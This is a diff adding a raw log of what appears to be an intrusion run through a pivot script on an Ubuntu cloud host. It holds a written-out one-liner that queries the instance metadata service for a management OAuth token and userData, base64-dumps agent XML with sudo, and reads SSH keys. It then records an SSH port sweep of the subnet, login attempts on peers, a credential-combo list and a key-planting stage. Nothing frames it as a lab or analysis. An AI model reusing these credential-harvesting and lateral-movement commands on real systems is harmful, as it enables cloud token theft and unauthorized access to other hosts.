@@ -1,0 +1,75 @@
+==M3-START host=t19-l40s1-eude2-canon ts=1795584232
+chmod: changing permissions of '/tmp/ibm_key.pem': Operation not permitted
+==A VIA-24
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+ID:
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),118(netdev),119(lxd)
+HNAME:
+t19-l4s-eudk
+10.243.0.24 
+ROUTE:
+default via 10.243.0.1 dev ens3 
+default via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.24 metric 100 
+10.243.0.0/24 dev ens3 proto kernel scope link src 10.243.0.24 
+10.243.0.1 dev ens3 proto dhcp scope link src 10.243.0.24 metric 100 
+161.26.0.6 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.24 metric 100 
+161.26.0.10 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.24 metric 100 
+161.26.0.11 via 10.243.0.1 dev ens3 proto dhcp src 10.243.0.24 metric 100 
+HOSTS:
+127.0.0.1 localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::1 ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+IMDS:
+
+IMDSUSERDATA:
+
+IMDSTOKEN:
+ul-bin/pivot3.sh: line 9: 2456519 Killed                  $S24 'echo ID:; id; echo HNAME:; hostname; hostname -I; echo ROUTE:; ip -4 route; echo HOSTS:; cat /etc/hosts; echo IMDS:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute?api-version=2021-12-13&format=json"; echo; echo IMDSUSERDATA:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text"; echo; echo IMDSTOKEN:; curl -s -m 8 -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"; echo; echo WAAGENT:; sudo -n ls -la /var/lib/waagent 2>&1 | head -20; echo WA-XML:; sudo -n bash -c "for f in /var/lib/waagent/*.xml; do echo ==F \$f; stat -c%s \$f; base64 -w0 \$f; echo; done" 2>&1 | head -40; echo NV:; ls -la /opt/t19 2>&1 | head -20; echo UNIT:; systemctl list-units "t19*" "nv*" --all --no-pager 2>&1 | head -20; echo SSHKEYS:; ls -la ~/.ssh 2>&1; echo AK:; cat ~/.ssh/authorized_keys 2>/dev/null | head -5' 2>&1
+==B VIA-24-SWEEP
+Warning: Permanently added '10.243.0.24' (ED25519) to the list of known hosts.
+10.243.0.24:22
+10.243.0.26:22
+10.243.0.27:22
+10.243.0.29:22
+10.243.0.30:22
+10.243.0.31:22
+==B2 VIA-24-SSHPEERS
+-- peer 10.243.0.26
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.18
+debug1: compat_banner: match: OpenSSH_8.9p1 Ubuntu-3ubuntu0.18 pat OpenSSH* compat 0x04000000
+debug1: Authentications that can continue: publickey
+debug1: Authentications that can continue: publickey
+ubuntu@10.243.0.26: Permission denied (publickey).
+-- peer 10.243.0.27
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.18
+debug1: compat_banner: match: OpenSSH_8.9p1 Ubuntu-3ubuntu0.18 pat OpenSSH* compat 0x04000000
+debug1: Authentications that can continue: publickey
+debug1: Authentications that can continue: publickey
+ubuntu@10.243.0.27: Permission denied (publickey).
+-- peer 10.243.0.30
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.18
+debug1: compat_banner: match: OpenSSH_8.9p1 Ubuntu-3ubuntu0.18 pat OpenSSH* compat 0x04000000
+debug1: Authentications that can continue: publickey
+debug1: Authentications that can continue: publickey
+ubuntu@10.243.0.30: Permission denied (publickey).
+-- peer 10.243.0.31
+debug1: Remote protocol version 2.0, remote software version OpenSSH_8.9p1 Ubuntu-3ubuntu0.18
+debug1: compat_banner: match: OpenSSH_8.9p1 Ubuntu-3ubuntu0.18 pat OpenSSH* compat 0x04000000
+debug1: Authentications that can continue: publickey
+debug1: Authentications that can continue: publickey
+ubuntu@10.243.0.31: Permission denied (publickey).
+-- peer 10.243.0.1
+debug1: connect to address 10.243.0.1 port 22: Connection timed out
+ssh: connect to host 10.243.0.1 port 22: Connection timed out
+-- peer 10.243.0.4
+==C PUBLICWAVE
+177 /tmp/pubcombos.txt
+PUBWAVE_N=0
+==D PLANT-PUB
+==M3-END
